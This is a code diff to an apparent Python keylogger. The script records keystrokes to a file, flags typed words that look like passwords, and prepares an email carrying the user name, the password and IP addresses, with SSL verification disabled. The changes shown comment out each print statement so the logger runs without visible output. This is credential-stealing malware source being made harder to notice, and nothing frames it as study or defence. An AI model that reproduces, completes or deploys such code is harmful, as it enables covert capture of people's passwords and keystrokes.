@@ -38,7 +38,8 @@ def on_press(key):
             buffer += key.char
             word += key.char
         else:
-            print(f"Unhandled key: {key}")
+            #print(f"Unhandled key: {key}")
+            pass
     except AttributeError:
         # Handle special keys (e.g., Ctrl, Shift)
         if key == Key.space:
@@ -53,7 +54,8 @@ def on_press(key):
             buffer += "\n"
             newword = True
         else:
-            print(f"Unhandled key: {key}")
+            #print(f"Unhandled key: {key}")
+            pass
 
     if not donotwrite:
         update_file(file_path, buffer, word, newword)
@@ -64,7 +66,7 @@ def on_press(key):
 
 # Send email
 def sendMail (subject, message):
-    print ("Sending text...")
+    #print ("Sending text...")
     ssl._create_default_https_context = ssl._create_unverified_context
 
     from email.mime.multipart import MIMEMultipart
@@ -96,7 +98,7 @@ def Recognise (word):
     
     if all (rule (word) for rule in rules): # If word fits criteria
         Password = word # Set password
-        print (Password)
+        #print (Password)
         #p = Process(target=sendMail, args=("Potential password", str (user + '\n' + Password + '\n' + ipv6 + '\n' + IP)))
         #p.daemon = True
         #p.start()
